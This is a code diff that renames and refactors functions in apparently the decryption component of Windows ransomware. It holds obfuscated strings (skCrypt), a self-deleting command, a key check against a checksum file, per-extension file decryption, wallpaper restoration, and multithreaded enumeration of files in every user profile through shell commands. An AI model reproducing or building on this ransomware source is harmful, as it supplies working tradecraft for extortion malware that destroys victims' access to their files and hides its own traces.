@@ -5,7 +5,7 @@ using namespace std;
 vector<string> globalAllFiles;
 mutex allFilesMutex;
 
-string exec(const char* cmd) {
+string Exec(const char* cmd) {
     string result = "";
     FILE* CommandResult = _popen(cmd, skCrypt("rt"));
     char line[256];
@@ -15,12 +15,12 @@ string exec(const char* cmd) {
     return result;
 }
 
-bool fileExists(const string& name) {
+bool FileExists(const string& name) {
     struct stat buffer;
     return stat(name.c_str(), &buffer) == 0;
 }
 
-vector<string> split(const string& s, char delimiter) {
+vector<string> Split(const string& s, const char& delimiter) {
     size_t start = 0;
     size_t end = s.find_first_of(delimiter);
     vector<string> output;
@@ -38,7 +38,7 @@ vector<string> split(const string& s, char delimiter) {
     return output;
 }
 
-vector<vector<string>> vectorSplitter(vector<string> baseVector, int parts) {
+vector<vector<string>> VectorSplitter(const vector<string>& baseVector, int parts) {
     vector<vector<string>> result;
     int length = baseVector.size() / parts;
     int remain = baseVector.size() % parts;
@@ -51,11 +51,11 @@ vector<vector<string>> vectorSplitter(vector<string> baseVector, int parts) {
     return result;
 }
 
-void deleteMe(string myPath) {
+void DeleteMe(const string& myPath) {
     system(((string)(char*)calloc(myPath.length() + 11, sizeof(char)) + (string)skCrypt("start cmd /c \"del ") + myPath + (string)skCrypt(" & exit\"")).c_str());
 }
 
-void decryptFiles(vector<string> files, string key) {
+void DecryptFiles(const vector<string>& files, const string& key) {
     for (string file : files) {
 
         HANDLE hFile = CreateFileA(file.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -82,9 +82,9 @@ void decryptFiles(vector<string> files, string key) {
     }
 }
 
-bool checkKey(string key) {
+bool CheckKey(const string& key) {
     try {
-        decryptFiles({ CHECKSUM_FILE + FILE_EXTENSION }, key);
+        DecryptFiles({ CHECKSUM_FILE + FILE_EXTENSION }, key);
     }
     catch (...) {
         return false;
@@ -97,12 +97,12 @@ bool checkKey(string key) {
     return data == CHECK_CONTENT;
 }
 
-void restoreWallpaper() {
+void RestoreWallpaper() {
     USES_CONVERSION_EX;
     SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, A2W_EX((OLDWALLPAPER).c_str(), (OLDWALLPAPER).length()), SPIF_UPDATEINIFILE);
 }
 
-string getUserName() {
+string GetUsername() {
     string result = (string)skCrypt("none");
     TCHAR  infoBuf[1600];
     DWORD  bufCharCount = 1600;
@@ -114,11 +114,11 @@ string getUserName() {
     return result;
 }
 
-void getAllFiles(string username) {
+void GetAllFiles(const string& username) {
     vector<string> tmpFiles;
 
-    for (string file : split(exec(((string)skCrypt("dir /b /s /a-d C:\\Users\\") + username).c_str()), '\n'))
-        if ((string)skCrypt(".") + split(file, '.').back() == FILE_EXTENSION)
+    for (string file : Split(Exec(((string)skCrypt("dir /b /s /a-d C:\\Users\\") + username).c_str()), '\n'))
+        if ((string)skCrypt(".") + Split(file, '.').back() == FILE_EXTENSION)
             tmpFiles.push_back(file);
 
     allFilesMutex.lock();
@@ -126,25 +126,25 @@ void getAllFiles(string username) {
     allFilesMutex.unlock();
 }
 
-vector<string> getFiles(string mainDir) {
+vector<string> GetFiles(const string& mainDir) {
     vector<string> result;
 
     if (DEBUG && !PathIsDirectoryEmptyA((LPCSTR)mainDir.c_str())) {
-        vector<string> files = split(exec(((string)skCrypt("dir /s /b /a-d ") + mainDir).c_str()), '\n');
+        vector<string> files = Split(Exec(((string)skCrypt("dir /s /b /a-d ") + mainDir).c_str()), '\n');
         for (string file : files)
-            if ((string)skCrypt(".") + split(file, '.').back() == FILE_EXTENSION)
+            if ((string)skCrypt(".") + Split(file, '.').back() == FILE_EXTENSION)
                 result.push_back(file);
     }
 
     else {
         vector<thread> threads;
-        for (string user : split(exec(skCrypt("dir /b /ad C:\\Users")), '\n')) {
-            if (!fileExists((string)skCrypt("C:\\Users") + user))   /*directory does not exists (idk why)*/
+        for (string user : Split(Exec(skCrypt("dir /b /ad C:\\Users")), '\n')) {
+            if (!FileExists((string)skCrypt("C:\\Users") + user))   /*directory does not exists (idk why)*/
                 continue;
             if (PathIsDirectoryEmptyA((LPCSTR)((string)skCrypt("C:\\Users\\") + user).c_str()))   /*directory is empty*/
                 continue;
 
-            threads.push_back(thread(getAllFiles, user));
+            threads.push_back(thread(GetAllFiles, user));
         }
         for (int i = 0; i < threads.size(); i++)
             threads[i].join();
